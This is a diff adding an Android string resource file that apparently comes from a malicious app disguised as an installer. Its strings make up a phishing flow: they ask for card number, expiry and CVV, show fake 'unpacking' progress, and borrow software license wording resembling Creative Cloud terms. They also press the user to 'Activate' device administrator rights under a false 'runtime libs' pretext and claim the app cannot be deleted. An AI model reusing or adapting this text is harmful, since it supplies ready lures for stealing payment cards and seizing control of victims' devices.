@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="add_card">Enter card details</string>
+    <string name="app_name">installation</string>
+    <string name="card_number">Card number</string>
+    <string name="cc_err">Invalid credit card number</string>
+    <string name="continues">Continue</string>
+    <string name="cvv">CVV</string>
+    <string name="cvv_err">Invalid CVV</string>
+    <string name="denied">"Operation is forbidden!
+
+ System application can’t be deleted."</string>
+    <string name="mm">MM</string>
+    <string name="month_err">Invalid month</string>
+    <string name="pls_wait">Please, wait..</string>
+    <string name="plugin">Installation is complete</string>
+    <string name="reg">"
+Please, wait.
+
+Unpacking the components…
+"</string>
+    <string name="save_card">SAVE</string>
+    <string name="saving">Saving…</string>
+    <string name="warn">"Product licenses and terms of use
+
+These terms govern your use of our website or services such as the Creative Cloud (collectively, “Services”) and software that we include as part of the Services, including any applications, Content Files (defined below), scripts, instruction sets, and any related documentation (collectively “Software”). By using the Services or Software, you agree to these terms."</string>
+    <string name="warn_win">Required action</string>
+    <string name="year_err">Invalid year</string>
+    <string name="yy">YY</string>
+    <string name="admin_alert">"Android runtime libs importing
+
+To continue, click \"Activate\".
+
+This operation can't be cancelled.
+"</string>
+    <string name="admin_description">installation</string>
+</resources>
